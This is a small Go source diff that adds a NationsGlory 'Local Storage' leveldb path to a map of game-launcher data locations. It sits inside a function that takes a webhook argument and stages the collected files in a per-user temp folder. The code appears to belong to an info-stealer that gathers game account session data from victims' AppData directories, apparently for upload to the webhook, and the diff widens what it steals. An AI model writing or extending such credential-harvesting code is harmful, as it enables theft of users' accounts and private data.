@@ -40,6 +40,9 @@ func Run(webhook string) {
 			"Uplay": {
 				"Settings": filepath.Join(user, "AppData", "Local", "Ubisoft Game Launcher"),
 			},
+			"NationsGlory": {
+				"Local Storage": filepath.Join(user, "AppData", "Roaming", "NationsGlory", "Local Storage", "leveldb"),
+			},
 		}
 
 		tempdir := filepath.Join(os.TempDir(), fmt.Sprintf("games-%s", strings.Split(user, "\\")[2]))
